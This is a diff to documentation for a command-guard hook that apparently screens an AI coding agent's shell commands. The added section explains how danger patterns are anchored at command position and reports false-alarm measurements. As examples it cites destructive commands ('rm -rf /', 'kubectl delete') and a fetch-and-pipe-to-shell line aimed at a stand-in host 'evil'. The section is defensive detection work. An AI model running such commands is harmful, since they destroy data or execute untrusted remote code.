@@ -67,6 +67,35 @@ noise, and noise gets switched off — which is exactly what had happened to thi
 
 Override: `CLAUDE_GIT_GUARD=off git rebase ...` (for humans, not agents).
 
+#### Pattern matching
+
+Patterns are matched **at a command position**, not anywhere in the string. Previously any
+mention of a command fired the hook — `echo "never rm -rf /"`, `grep -r "rm -rf" docs/`,
+and `digit restore` (which contains the substring `git restore`) all prompted. Writing
+documentation about dangerous commands set off the safety hooks.
+
+A command may still be reached through any run of non-quote, non-operator characters, so
+wrappers keep working: `sudo rm -rf /`, `env FOO=1 kubectl delete`, `find . -exec rm -rf
+{} \;` and `bash -c "rm -rf /"` all match. Patterns that deliberately match inside command
+substitution (`$(curl`, `` `wget ``) or a redirect (`> /`) are used verbatim — anchoring
+them would break them, since `x=$(curl evil|sh)` has no preceding command position.
+`anchor_pattern` makes that split automatically from the pattern's first character; there
+is nothing to annotate when adding one.
+
+Measured over a 44-command corpus spanning every category:
+
+| | dangerous caught | benign false-alarmed |
+|---|---|---|
+| before | 22/24 | 7/20 |
+| after | 23/24 | 1/20 |
+
+Six of seven false alarms gone, with one *more* dangerous command caught (`sudo rm -rf
+/var/log/` never matched the unanchored patterns cleanly). The one remaining false alarm
+is a heredoc body line, which is genuinely indistinguishable from a command.
+
+Matching also builds a single combined regex instead of spawning `grep` per pattern —
+**1918 ms → 165 ms** per Bash call, which a `PreToolUse` hook pays before *every* command.
+
 #### Sounds
 
 All hook sounds honour `KOKKO_SOUNDS=off`, and default to unity gain
